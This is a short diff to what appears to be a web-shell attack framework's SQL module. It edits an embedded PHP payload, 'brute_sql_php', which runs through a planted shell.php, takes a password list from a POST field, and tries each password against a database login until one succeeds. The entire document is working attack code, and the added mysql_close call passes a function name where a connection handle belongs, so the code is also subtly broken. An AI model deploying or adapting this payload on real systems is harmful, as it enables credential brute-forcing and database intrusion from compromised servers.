@@ -20,11 +20,13 @@ class Sql(Module):
             Vector('shell.php', 'brute_sql_php', """$m="%s"; $h="%s"; $u="%s"; $w=$_POST["%s"]; 
 ini_set('mysql.connect_timeout',1);
 foreach(split('[\n]+',$w) as $pwd) {
-if(@$m("$h", "$u", "$pwd")){
+$c=@$m("$h", "$u", "$pwd");
+if($c){
 print("+" . $u . ":" . $pwd . "\n");
 break;
 }
 } 
+mysql_close($m);
 """)
             ])
 
